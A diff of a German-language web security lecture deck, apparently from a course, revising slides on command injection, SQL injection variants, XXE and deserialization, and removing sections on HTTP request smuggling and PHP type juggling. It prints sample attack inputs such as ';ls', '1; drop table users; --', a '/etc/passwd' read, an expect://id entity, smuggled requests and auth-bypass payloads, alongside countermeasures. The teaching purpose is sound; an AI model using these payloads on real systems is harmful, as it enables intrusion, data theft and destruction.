@@ -19,12 +19,6 @@ title: Web Security
   * Web Application Security Scanner
   * Tools für Spezialbereiche wie SQLi
  
-## Problem: große Angriffsfläche
-
-* Computer Game Maps (CS, SC)
-* Flickr-Javascript Injection
-* QR-Codes / Nummerntaffeln
-
 ## Lösung
 
 * Überprüfung aller Eingaben
@@ -35,6 +29,13 @@ title: Web Security
 
 * Sandboxing
   * to minimize impact
+
+## Problem: große Angriffsfläche
+
+* Computer Game Maps (CS, SC)
+* Flickr-Javascript Injection
+* QR-Codes / Nummerntaffeln
+
 
 # Command Injections
 
@@ -61,26 +62,14 @@ os.system('ping ' + domain)
 ;ls
 $(ls)
 `ls`
+
+# Ergebnis:
+ping www.snikt.net;ls
 ```
 
 ## Beispiel: TP-Link Router
 
 * [Flash Instruction](https://openwrt.org/toh/tp-link/tl-wr703n)
-
-## Wie werden Dateien gelesen?
-
-Gedacht:
-
-``` url
-http://sensitive/cgi-bin/userData.pl?doc=user1.txt
-```
-
-Versuche mit
-
-```
-http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
-http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
-```
 
 ## Gefährliche Funktionen
 
@@ -137,8 +126,8 @@ Hintergrund: SQL Operation wird mit String Concat gebaut
 
 ``` Java
 query = "select * from users ";
-query = query + "where username = " +username;
-query = query + " and password = " +password +’ limit 1;
+query = query + "where username = '" +username + "'";
+query = query + " and password = '" +password +"' limit 1;
 ```
 
 ## Simples Beispiel
@@ -158,15 +147,19 @@ where username = ‘ah‘ and password = ‘1’ or ‘1’ = ‘1’ limit 1;
 
 ## Stacked Queries
 
-* URL: http://snikt.net/test.php?id=1
-* Operation: select * from articles where id=1
-
 ``` SQL
+
+# URL
+http://snikt.net/test.php?id=1
+
+# Operation:
+select * from articles where id=1
+
 # Eingabe
-`1; drop table users; --
+1; drop table users; --
 
 # Ergebnis
-select * from articles wehre id=1;drop table users;--
+select * from articles where id=1;drop table users;--
 ```
 
 ## Union-Based SQLi
@@ -179,7 +172,7 @@ select * from articles wehre id=1;drop table users;--
 select Name, Phone, Address FROM users where user_id=1
 ```
 
-## Versuch mehr Daten zu extrahieren
+## Versuch, weitere Daten zu extrahieren
 
 * Spaltenanzahl erraten
 
@@ -202,6 +195,10 @@ SELECT creditCardNumber,1,1 FROM CreditCardTable
 Eine Datenbank-Fehlermeldung wird als Rückkanal verwendet
 
 ``` sql
+# normal
+select * from table where id = 1
+
+# angriff
 select * from table where id = (select username, password from users);
 
 # fehlermeldung:
@@ -210,23 +207,26 @@ Cannot compare id (integer) with ["root", "password"]
 
 ## Beispiel: Boolean-based blind SQLi
 
-* URL: http://snikt.net/show_product?id=1
-* Query: select * from product where id = 1;
+* URL: http://snikt.net/show_user?id=1
+* Annahmen:
+  * Query: select * from users where id = 1;
+  * id besitzt Injection-Lücke
+  * Aber kein Ausgabekanal in der Seite
 
 ## Oracle wird festgestellt:
 
 ``` sql
-# id: "1 or 1=0" -> Produkt wird angezeigt
-select * from products where id=1 or 1=0;
+# id: "1 or 1=0" -> user wird angezeigt
+select * from users where id=1 or 1=0;
 
 # id: "1 and 1=0" -> Kein Produkt wird angezeigt
-select * from products where id=1 and 1=0;
+select * from users where id=1 and 1=0;
 ```
 
-## Beispiel: auslesen der ersten Stelle eines Benutzernamens
+## Beispiel: Auslesen der ersten Stelle eines Benutzernamens
 
 ``` sql
-SELECT field1, field2, field3
+SELECT *
 FROM Users
 WHERE Id=1 AND ASCII(SUBSTRING(username,1,1))=97
 ```
@@ -251,7 +251,7 @@ AND IF(version() like ‘5%’, sleep(10), ‘false’))--
 ## Problem: Database-Escape
 
 * MySQL, PostgreSQL und MSSQL erlauben es, Kommandos ausgehend von SQL auszuführen
-* z. B. xp_cmdshell bei MSSQL
+* z.B. xp_cmdshell bei MSSQL
 
 Postgresql (user muss db admin sein)
 
@@ -292,6 +292,9 @@ $STH->execute();
   * Spaltennamen
   * ASC/DESC
 * In dem Fall: Whitelisting oder Query umbauen
+
+## Gegenmaßnahme: prepared statements
+
 * Vorteil von prepared statements: Logik bleibt in der Applikation
 
 ## Gegenmaßnahme: Escape Input Data
@@ -414,10 +417,7 @@ Es werden die Token des aktuellen Benutzers verwendet.
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "expect://id" >]>
-<creds>
-    <user>&xxe;</user>
-    <pass>mypass</pass>
-</creds>
+<foo>&xee;</foo>
 ```
 
 ## Gegenmaßnahmen
@@ -515,249 +515,5 @@ payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
 * Austauschen des Deserialisierers mit Custom Serializer (look-ahead)
 * Serialiserungsoperationen müssen authenticated und authorized sein
 * Serialisierte Objekte müssen integritätsgeschützt werden
-
-# HTTP Request Smuggling
-
-## About
-
-* Angriff auf die "Infrastruktur"
-* Kudos zu [PortSwigger](https://portswigger.net/web-security/request-smuggling)
-* Community Mention 2019
-
-## Normaler Ablauf
-
-![Picture](0x08_revproxy.svg){.stretch}
-
-## Angriff
-
-![Picture](0x08_revproxy-desynced.svg){.stretch}
-
-## HTTP Request Länge
-
-Content-Length Header:
-
-``` http
-POST /search HTTP/1.1
-Host: normal-website.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 11
-
-q=smuggling
-```
-
-## Angriff (~2005):
-
-``` http
-POST / HTTP/1.1
-Host: example.com
-Content-Length: 6
-Content-Length: 5
-
-12345G
-```
-
-Might result in:
-``` http
-POST / HTTP/1.1
-Host: example.com
-Content-Length: 6
-Content-Length: 5
-
-12345GPOST / HTTP/1.1
-Host: example.com
-```
-
-## This was fixed..
-
-## HTTP Request Länge
-
-"chunked" (0xb == 11):
-
-``` http
-POST /search HTTP/1.1
-Host: normal-website.com
-Content-Type: application/x-www-form-urlencoded
-Transfer-Encoding: chunked
-
-b
-q=smuggling
-0
-```
-
-## Angriff (~2019):
-
-CL -> TE
-
-``` http
- POST / HTTP/1.1
- Host: vulnerable-website.com
- Content-Length: 13
- Transfer-Encoding: chunked
-
- 0
-
- SMUGGLED 
- ```
-
-## Angriff (~2019):
-
-TE -> CL
-
-``` http
-POST / HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
-```
-
-## Angriff (~2019) 
-
-TE -> TE
-
-```
-Transfer-Encoding: xchunked
-
-Transfer-Encoding : chunked
-
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-
-Transfer-Encoding:[tab]chunked
-
-[space]Transfer-Encoding: chunked
-
-X: X[\n]Transfer-Encoding: chunked
-
-Transfer-Encoding
-: chunked
-```
-
-## But what to do with that
-
-## But what to do with that
-
-```
-GET / HTTP/1.1
-Host: vulnerable-website.com
-Transfer-Encoding: chunked
-Content-Length: 324
-
-0
-
-POST /post/comment HTTP/1.1
-Host: vulnerable-website.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 400
-Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
-
-csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
-```
-
-## Results in
-
-```
-POST /post/comment HTTP/1.1
-Host: vulnerable-website.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 400
-Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
-
-csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
-Host: vulnerable-website.com
-Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
-... 
-```
-
-## Gegenmassnahmen
-
-* Jeden Backend-Request über eine eigene Connection schicken
-* Backend und Frontend müssen den gleichen Längen-Identifier verwenden
-* HTTP/2 verwenden
-
-# PHP Type Juggling
-
-## Vergleichsoperator ===
-
-![Picture](0x09_type_juggling_1.png){.stretch}
-
-## Vergleichsoperator ==
-
-![Picture](0x09_type_juggling_2.png){.stretch}
-
-## Hint
-
-* es gibt auch != und !==
-
-## Fun Examples
-
-``` php
-TRUE: "0000" == int(0)
-TRUE: "0e12" == int(0)
-TRUE: "1abc" == int(1)
-TRUE: "0abc" == int(0)
-TRUE: "abc"  == int(0) // !!
-TRUE: "0e12345" == "0e54321"
-TRUE: "0e12345" <= "1"
-TRUE: "0e12345" == "0"
-TRUE: "0xF"     == "15"
-```
-
-## Exploit 1 (Larabel CSRF-Bypass)
-
-``` php
-if (Session::token() != Input::get('_token')) {
-   throw new Illuminate\Session\TokenMismatchException;
-}
-// authenticated operation
-```
-
-Token: Random-String, in 85% der Fälle mit 0 oder Buchstaben als erstes Zeichen
-
-## Exploit 1 (Larabel CSRF-Bypass)
-
-Exploit:
-```
-$.ajax("http://<laravel app>/sensitiveaction", {
-	type: 'post',
-	contentType: 'application/x-www-form-urlencoded; charset=UTF-8; /json',
-	data: '{"sensitiveparam": "sensitive", "_token": 0}',});
-```
-
-## Exploit 2 (Wordpress Auth Bypass)
-
-``` php
-# Cookie vom Browser:
-# beinhaltet: $hmac, $user, $expiration
-
-# serverseitiger Check
-if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
-  // authenticated operation
-}
-```
-
-## Attack
-
-``` php
-cookie: set $hmac=0, $user=admin
-brute-force over expiration
-hash_mac('md5', "admin"."|"."some-date", $key) -> "some-hash.."
-```
-
-``` php
-if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
-  // authenticated operation
-}
-```
-
-``` php
-# What if hash looks like "0eabcdefg" and $hmac is set to "0"
-if ("0" == "0eabcdefg") { // transforms to "0" == "0"
-   // authenticated operation
-}
-```
 
 # FIN
